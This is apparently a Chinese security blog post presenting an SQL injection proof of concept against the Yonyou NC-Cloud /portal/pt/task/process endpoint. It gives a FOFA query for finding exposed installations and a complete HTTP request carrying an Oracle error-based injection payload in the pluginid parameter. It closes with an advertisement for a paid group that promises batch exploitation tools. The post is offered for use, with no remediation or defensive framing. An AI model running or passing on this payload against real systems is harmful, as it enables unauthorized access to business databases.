#  用友NC-Cloud process SQL注入漏洞复现及POC   
原创 CatalyzeSec  CatalyzeSec   2024-12-06 10:25  
  
# FOFA  
```
body="/Client/Uclient/UClient.exe" || body="nccloud" || app="用友-NC-Cloud"
```  
# 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ylgRa0xDjNia4yfRMIxf9u6043cspQXxQddeEA0KpQb0YLR7sgDpwtvBOqOy098oibhGANwoHzwDjZg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ylgRa0xDjNia4yfRMIxf9u60NeqxS21RkUIEJaCZVHohj3zKBPgxvicaDfpibROciaU78LJlDPbwgVUuA/640?wx_fmt=png&from=appmsg "")  
# POC  
```
GET /portal/pt/task/process?pageId=login&id=1&oracle=1&pluginid=1'%20AND%205798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))--%20wXyW HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```  
# nuclei运行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ylgRa0xDjNia4yfRMIxf9u606DX2csXnyOweyrkX5pfB46Hl2Xgc5euRicRibYgldL9coU0xpmF99hAA/640?wx_fmt=png&from=appmsg "")  
# nuclei-poc已上传到知识星球  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ylgRa0xDjNia4yfRMIxf9u60y39WeaBw8Q0JnSr7I0R5A6JnrkWxRibn8vDNiblZCiaSvGQndMkwvuggw/640?wx_fmt=png&from=appmsg "")  
  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
**微信群专属推送机器人**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ylgRa0xDjNia4yfRMIxf9u60wMHcrtfFwcaYb4icgcTibIomjtWU3Ic1vviaHRxCgs3yIM3thQfVVjZJg/640?wx_fmt=png&from=appmsg "")  
#   
  
